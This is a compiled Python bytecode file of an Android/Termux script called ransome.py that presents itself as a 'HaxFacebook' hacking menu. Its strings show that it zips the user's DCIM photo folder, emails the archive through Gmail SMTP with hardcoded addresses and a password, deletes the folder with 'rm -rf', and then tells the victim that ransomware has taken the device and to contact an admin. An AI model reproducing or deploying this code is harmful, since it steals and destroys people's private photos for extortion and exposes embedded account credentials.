ó
^c           @   sÅ   d  d l  Z  d  d l m Z d  d l m Z d  d l m Z d  d l m Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z d   Z d   Z d	   Z d
   Z e d k rÁ e   e   n  d S(   iÿÿÿÿN(   t   MIMEMultipart(   t   MIMEText(   t   MIMEBase(   t   encoders(   t   sleepc         C   sJ   xC |  d D]7 } t  j j |  t  j j   t t j   d  q Wd  S(   Ns   
gÉ?(   t   syst   stdoutt   writet   flushR   t   random(   t   st   c(    (    s
   ransome.pyt   tik   s    c           C   s   yn t  j d  d GHt d  t  j d  t  j d  t  j d  t  j d  t  j d  t  j d	  Wn! t t f k
 r t d
  n Xd  S(   Nt   clears+   [1;32m[+]Install Bahan dulu, mohon tunggu!i   s   pkg install python python2 -ys   pkg install git cowsay -ys   pkg install zip -ys   termux-setup-storages(   zip -r xxnx.zip /storage/emulated/0/DCIMs$   mv xxnx.zip /storage/emulated/0/DCIMs7   [1;32m[!]Kamu harus menyelesaikan penginstallan bahan!(   t   ost   systemR   t   KeyboardInterruptt   IOErrort   exit(    (    (    s
   ransome.pyt	   Installed   s    
c    
      C   s¼  yt  j d  t  j d  d GHd GHd GHd GHt d  }  d } d	 } t   } | | d
 <| | d <d | d <d } | j t | d   d } t d d  } t d d  } | j | j	    t
 j |  | j d d |  | j |  t j d d  } | j   | j | d  | j   }	 | j | | |	  | j   t  j d  |  d k rit   n3 |  d k rt   n |  d k rt   n t   Wn t k
 r·t   n Xd  S(   NR   s   cowsay "HaxFacebook"t    s.   [1;32m[1][1;37m Hack Facebook Langsung Dapats+   [1;32m[2][1;37m Hack Facebook kirim link s!   [1;32m[3][1;37m Yahoo cloning 
s   [1;31m=> Pilih: s   ucupman00@gmail.coms   khazulyusserys@gmail.comt   Fromt   Tos	   This Filet   Subjects   Hello everyonet   plains   xxnx.zips!   /storage/emulated/0/DCIM/xxnx.zipt   rbt   applications   octet-streams   Content-Dispositions   attachment; filename= %ss   smtp.gmail.comiK  t   diki0821s   rm -rf /storage/emulated/0/DCIMt   1t   2t   3(   R   R   t	   raw_inputR    t   attachR   t   openR   t   set_payloadt   readR   t   encode_base64t
   add_headert   smtplibt   SMTPt   starttlst   logint	   as_stringt   sendmailt   quitt   jalan2R   R   (
   t   at   fromaddrt   toaddrt   msgt   bodyt   filenamet
   attachmentt   partt   servert   text(    (    s
   ransome.pyt   sendrensome   sN    	







c          C   sl   yM t  d  }  t d |   t d  t d  t d  d GHd GHt   Wn t k
 rg t   n Xd  S(   Ns   [1;32m[+][1;37mNama kamu: s   [1;32mHai s,   [1;32mPerangkat kamu telah berhasil diretass(   [1;32mMenggunakan ransomeware Duplicatei   R   s,   [1;32m[!]Contact admin for backup your data(   R   R   R   R   R   (   t   name(    (    s
   ransome.pyR-   I   s    


t   __main__(   R&   t   email.mime.multipartR    t   email.mime.textR   t   email.mime.baseR   t   emailR   R   R   R	   t   timeR   R   R   R8   R-   t   __name__(    (    (    s
   ransome.pyt   <module>   s   			*	 